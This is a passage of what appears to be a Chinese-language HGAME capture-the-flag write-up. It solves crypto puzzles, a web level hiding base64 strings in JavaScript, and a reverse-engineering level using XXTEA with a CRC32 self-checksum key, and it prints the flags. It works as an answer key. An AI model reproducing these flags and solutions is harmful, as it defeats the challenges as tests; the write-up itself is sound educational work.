class="string">&#x27;o.0&#x27;</span>), repeat=<span class="number">12</span>):</span><br><span class="line">            original_string = <span class="string">&#x27;&#x27;</span>.join(pattern)[:<span class="number">36</span>]</span><br><span class="line">            encoded_string, xored_string = codec.encode(original_string)</span><br><span class="line">            decrypted_hex_array = rc4_encrypt(encoded_string, encflag)</span><br><span class="line">            </span><br><span class="line">            file.write(<span class="string">f&quot;Original: <span class="subst">&#123;original_string&#125;</span>\n&quot;</span>)</span><br><span class="line">            file.write(<span class="string">f&quot;Encoded: <span class="subst">&#123;encoded_string&#125;</span>, <span class="subst">&#123;xored_string&#125;</span>\n&quot;</span>)</span><br><span class="line">            file.write(<span class="string">f&quot;Decrypted Hex Array: [<span class="subst">&#123;decrypted_hex_array[<span class="number">0</span>]&#125;</span>]\n&quot;</span>)</span><br><span class="line">            file.write(<span class="string">f&quot;Text: [<span class="subst">&#123;decrypted_hex_array[<span class="number">1</span>]&#125;</span>]\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;爆破结束.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>查找txt中的hgame，得到密钥与flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Original: o.00.oo.00.oo.0o.00.o0.o0.o0.o0.oo.0</span><br><span class="line"></span><br><span class="line">Encoded: lsCsRs06kc/yTc=/isREiIyXNZvBOdXyPInvPtOsQZKUdWqd, b&#x27;o/23\*ji)89$dc#&gt;`&gt;!&quot;=&#123;%8x(7u+2r.1ON\x0c\x13&#x27;</span><br><span class="line"></span><br><span class="line">Decrypted Hex Array: [0x68, 0x67, 0x61, 0x6D, 0x65, 0x7B, 0x34, 0x61, 0x66, 0x31, 0x35, 0x33, 0x62, 0x39, 0x2D, 0x65, 0x64, 0x33, 0x65, 0x2D, 0x34, 0x32, 0x30, 0x62, 0x2D, 0x39, 0x37, 0x38, 0x63, 0x2D, 0x65, 0x65, 0x66, 0x66, 0x37, 0x32, 0x33, 0x31, 0x38, 0x62, 0x34, 0x39, 0x7D]</span><br><span class="line"></span><br><span class="line">Text: [bytearray(b&#x27;hgame&#123;4af153b9-ed3e-420b-978c-eeff72318b49&#125;&#x27;)]</span><br></pre></td></tr></table></figure>
<p>则flag为<font color=deepskyblue><strong>hgame{4af153b9-ed3e-420b-978c-eeff72318b49}</strong></font>.</p>
<h2 id="Web："><a href="#Web：" class="headerlink" title="Web："></a>Web：</h2><h3 id="Level-24-Pacman："><a href="#Level-24-Pacman：" class="headerlink" title="Level 24 Pacman："></a>Level 24 Pacman：</h3><p>在index.js找到两个base64：<font color=lime><strong>aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ&#x3D;&#x3D;</strong></font>和<font color=LimeGreen><strong>aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0&#x3D;</strong></font>，分别对应<font color=lime><strong>haepaiemkspretgm{rtc_ae_efc}</strong></font>和<font color=LimeGreen><strong>haeu4epca_4trgm{_r_amnmse}</strong></font>，解栅栏密码得到<font color=lime><strong>hgame{pratice_makes_perfect}</strong></font>和<font color=deepskyblue><strong>hgame{u_4re_pacman_m4ster}</strong></font>，其中第二个是flag.</p>
<h1 id="赛题轮次：Week-2"><a href="#赛题轮次：Week-2" class="headerlink" title="赛题轮次：Week 2"></a>赛题轮次：Week 2</h1><h2 id="Crypto方向：-1"><a href="#Crypto方向：-1" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="Ancient-Recall："><a href="#Ancient-Recall：" class="headerlink" title="Ancient Recall："></a>Ancient Recall：</h3><p>观察发现是随机抽取塔罗牌，然后对其代表的索引进行相邻加和（也就是对于a、b、c、d、e，新的数组是a+b、b+c、c+d、d+e、e+a），加和了250次后输出，然后找到对应的索引输出新的名字，写出脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wheel</span>(<span class="params">FATE</span>):</span><br><span class="line">    FATEd = [((FATE[i]+FATE[(i+<span class="number">1</span>) % <span class="number">5</span>]) % <span class="number">78</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FATE))]</span><br><span class="line">    <span class="keyword">return</span> FATEd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_wheel</span>(<span class="params">array</span>):</span><br><span class="line">    new_array = [<span class="literal">None</span>]*<span class="number">5</span></span><br><span class="line">    total = <span class="built_in">int</span>(<span class="built_in">sum</span>(array) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        new_array[i] = (total - array[(i + <span class="number">1</span>) % <span class="number">5</span>] - array[(i + <span class="number">3</span>) % <span class="number">5</span>])</span><br><span class="line">    <span class="keyword">return</span> new_array</span><br><span class="line"></span><br><span class="line">array = [<span class="number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>, </span><br><span class="line"><span class="number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>,</span><br><span class="line"><span class="number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>, </span><br><span class="line"><span class="number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>, </span><br><span class="line"><span class="number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span>]</span><br><span class="line">array2 = [<span class="literal">None</span>]*<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    array2[i] = array[i] % <span class="number">78</span></span><br><span class="line"><span class="built_in">print</span>(array2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>):</span><br><span class="line">    array = de_wheel(array)</span><br><span class="line"><span class="built_in">print</span>(array)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>):</span><br><span class="line">    array = wheel(array)</span><br><span class="line"><span class="built_in">print</span>(array)</span><br></pre></td></tr></table></figure>
<p>输出原来的牌组索引：<font color=lime><strong>[-19, -20, 20, -15, 41]</strong></font>，其中负数的是因为在生成时加入了<code>re-</code>的前缀，并且异或了<code>-1</code>，则原来的值是<font color=lime><strong>[18, 19, 20, 14, 41]</strong></font>，其中第1、2、4张牌是re-前缀的，找到这些索引对应的牌名，拼凑起来得到flag：</p>
<p><font color=deepskyblue><strong>hgame{re-The_Moon&amp;re-The_Sun&amp;Judgement&amp;re-Temperance&amp;Six_of_Cups}</strong></font>.</p>
<h2 id="Reverse方向：-1"><a href="#Reverse方向：-1" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="Signin："><a href="#Signin：" class="headerlink" title="Signin："></a>Signin：</h3><p>反编译观察主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">6</span>]; <span class="comment">// [rsp+30h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Source[<span class="number">82</span>]; <span class="comment">// [rsp+36h] [rbp+16h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">264</span>]; <span class="comment">// [rsp+88h] [rbp+68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">42</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7035370A3, argv, envp);</span><br><span class="line">  sub_7FF703473792((__int64)Str1, <span class="number">0</span>i64, <span class="number">64</span>i64);</span><br><span class="line">  sub_7FF703472941(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  sub_7FF70347180C(<span class="string">&quot;%44s&quot;</span>, Str1);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_7FF703472EC3() &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)sub_7FF7034734F9() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !j_strncmp(Str1, <span class="string">&quot;hgame&#123;&quot;</span>, <span class="number">6u</span>i64)</span><br><span class="line">      &amp;&amp; (j_strncpy(Destination, Source, <span class="number">0x24u</span>i64), (<span class="type">unsigned</span> <span class="type">int</span>)sub_7FF7034714D3((__int64)Destination)) )</span><br><span class="line">    &#123;</span><br><span class="line">      j_puts(<span class="string">&quot;right&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      j_puts(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    j_puts(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察sub_7FF7034714D3所指向的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF703478820</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7035370A3, a2, a3);</span><br><span class="line">  sub_7FF7034716EF(a1, dword_7FF70352B2A0, qword_7FF70352B880);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">36</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">unsigned</span> __int8 *)(a1 + i) != (<span class="type">unsigned</span> __int8)a0[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>则sub_7FF7034716EF应该是加密函数，密文为a0：<font color=lime><strong>[0x23, 0xEA, 0x50, 0x30, 0x00, 0x4C, 0x51, 0x47, 0xEE, 0x9C, 0x76, 0x2B, 0xD5, 0xE6, 0x94, 0x17, 0xED, 0x2B, 0xE4, 0xB3, 0xCB, 0x36, 0xD5, 0x61, 0xC0, 0xC2, 0xA0, 0x7C, 0xFE, 0x67, 0xD7, 0x5E, 0xAF, 0xE0, 0x79, 0xC5]</strong></font>，密钥为dword_7FF70352B2A0：<font color=LimeGreen><strong>[0x97A25FB5, 0x93E1C763, 0xA143464A, 0x5A8F284F]</strong></font>，观察加密函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF703478E70</span><span class="params">(_DWORD *a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+C4h] [rbp+A4h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+194h] [rbp+174h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+194h] [rbp+174h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7035370A3, a2, a3);</span><br><span class="line">  v8 = <span class="number">11</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = a1[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 += *(_DWORD *)(a3 + <span class="number">4</span>i64 * (v8 % <span class="number">4</span>));</span><br><span class="line">    v9 = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = a1[i + <span class="number">1</span>];</span><br><span class="line">      v10 = (((v5 ^ *(_DWORD *)(a2 + <span class="number">4</span>i64 * (v9 ^ i &amp; <span class="number">3</span>))) + (v4 ^ v6)) ^ (((<span class="number">16</span> * v5) ^ (v4 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * v4) ^ (v5 &gt;&gt; <span class="number">5</span>)))) + a1[i];</span><br><span class="line">      a1[i] = v10;</span><br><span class="line">      v5 = v10;</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = (((v5 ^ *(_DWORD *)(a2 + <span class="number">4</span>i64 * (v9 ^ i &amp; <span class="number">3</span>))) + (*a1 ^ v6)) ^ (((<span class="number">16</span> * v5) ^ (*a1 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * *a1) ^ (v5 &gt;&gt; <span class="number">5</span>)))) + a1[<span class="number">8</span>];</span><br><span class="line">    a1[<span class="number">8</span>] = v11;</span><br><span class="line">    v5 = v11;</span><br><span class="line">    result = --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现是XXTEA，重构加密函数：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    v6 += a3[v8 % <span class="number">4</span>]</span><br><span class="line">    v9 = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        after = a1[(i + <span class="number">1</span>) % <span class="number">9</span>]</span><br><span class="line">        before = a1[(i - <span class="number">1</span>) % <span class="number">9</span>]</span><br><span class="line">        a1[i] = (a1[i] + (((before ^ a2[v9 ^ i &amp; <span class="number">3</span>]) + (after ^ v6)) ^ (((before &lt;&lt; <span class="number">4</span>) ^ (after &gt;&gt; <span class="number">3</span>)) + ((after &lt;&lt; <span class="number">2</span>) ^ (before &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xFFFFFFFF</span></span><br></pre></td></tr></table></figure>
<p>运行发现结果相同，写出逆向解密函数：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    v6 += a3[v8 % <span class="number">4</span>]</span><br><span class="line">    v9 = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        after = a1[(i + <span class="number">1</span>) % <span class="number">9</span>]</span><br><span class="line">        before = a1[(i - <span class="number">1</span>) % <span class="number">9</span>]</span><br><span class="line">        a1[i] = (a1[i] - (((before ^ a2[v9 ^ i &amp; <span class="number">3</span>]) + (after ^ v6)) ^ (((before &lt;&lt; <span class="number">4</span>) ^ (after &gt;&gt; <span class="number">3</span>)) + ((after &lt;&lt; <span class="number">2</span>) ^ (before &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xFFFFFFFF</span></span><br></pre></td></tr></table></figure>
<p>带入密文解密得到的却是乱码，检查带入的key（a2），发现a2的数值是动态的，查找a2的xref研究a2的生成过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF69C8D8670</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode((__int64)&amp;unk_7FF69C9970A3, a2, a3);</span><br><span class="line">  v4 = (<span class="type">char</span> *)j_j_j__malloc_base(<span class="number">0x10000u</span>i64);</span><br><span class="line">  sub_7FF69C8D3792((__int64)v4, <span class="number">0</span>i64, <span class="number">0x10000</span>i64);</span><br><span class="line">  sub_7FF69C8D29C8(v4, main, <span class="number">0x10000</span>i64);</span><br><span class="line">  sub_7FF69C8D11D6();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">    key[i] = sub_7FF69C8D1AB4(&amp;v4[<span class="number">0x4000</span> * i], <span class="number">0x4000</span>i64);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中这两个函数涉及到了密钥的产生，查看这两个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF69C8D88D0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line"></span><br><span class="line">  result = j___CheckForDebuggerJustMyCode((__int64)&amp;unk_7FF69C9970A3, a2, a3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v4 = (v4 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ALLCRC[i] = v4;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现第一个函数生成了一个256项的CRC32查找表，再看第二个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF69C8D8760</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode((__int64)&amp;unk_7FF69C9970A3, a2, a3);</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; i &lt; a2; ++i )</span><br><span class="line">    v4 = ALLCRC[(<span class="type">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ v4)] ^ (v4 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现这个函数是用于计算CRC32校验值的，结合刚才的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = (<span class="type">char</span> *)j_j_j__malloc_base(<span class="number">0x10000u</span>i64);</span><br><span class="line">sub_7FF69C8D3792((__int64)v4, <span class="number">0</span>i64, <span class="number">0x10000</span>i64);</span><br><span class="line">sub_7FF69C8D29C8(v4, main, <span class="number">0x10000</span>i64);</span><br><span class="line">sub_7FF69C8D11D6();</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  key[i] = sub_7FF69C8D1AB4(&amp;v4[<span class="number">0x4000</span> * i], <span class="number">0x4000</span>i64);</span><br></pre></td></tr></table></figure>
<p>发现是将程序从main开始的<code>0x10000</code>字节内所有函数的机器码复制到v4，密钥实际上是v4的每个四分之一（大小0x4000）的CRC32校验值，多次调试控制变量后发现key与所下的断点有关（因为断点改变了函数的机器码），将全部断点取消后执行到key赋值完毕，将v4的0x10000字节dump出来，和原有的进行对比，验证了上述复制机器码的猜想后，将全部0x10000字节覆盖为原有的机器码，手动求出CRC32值，得到key：<font color=lime><strong>[0x97A25FB5, 0xE1756DBA, 0xA143464A, 0x5A8F284F]</strong></font>，带入解密脚本解密：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_le</span>(<span class="params">byte_str</span>):</span><br><span class="line">    dwords = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(byte_str), <span class="number">4</span>):</span><br><span class="line">        chunk = byte_str[i:i+<span class="number">4</span>]</span><br><span class="line">        dword = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, chunk)[<span class="number">0</span>]</span><br><span class="line">        dwords.append(dword)  </span><br><span class="line">    <span class="keyword">return</span> dwords</span><br><span class="line"></span><br><span class="line">input_str = <span class="string">b&quot;\x23\xea\x50\x30\x00\x4c\x51\x47\xee\x9c\x76\x2b\xd5\xe6\x94\x17\xed\x2b\xe4\xb3\xcb\x36\xd5\x61\xc0\xc2\xa0\x7c\xfe\x67\xd7\x5e\xaf\xe0\x79\xc5&quot;</span></span><br><span class="line">output = bytes_to_dwords_le(input_str)</span><br><span class="line"></span><br><span class="line">a1 = output</span><br><span class="line">a2 = [<span class="number">0x97A25FB5</span>, <span class="number">0xe1756dba</span>, <span class="number">0xA143464A</span>, <span class="number">0x5A8F284F</span>]</span><br><span class="line">a3 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="keyword">for</span> v8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    v6 += a3[v8 % <span class="number">4</span>]</span><br><span class="line">    v9 = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        after = a1[(i + <span class="number">1</span>) % <span 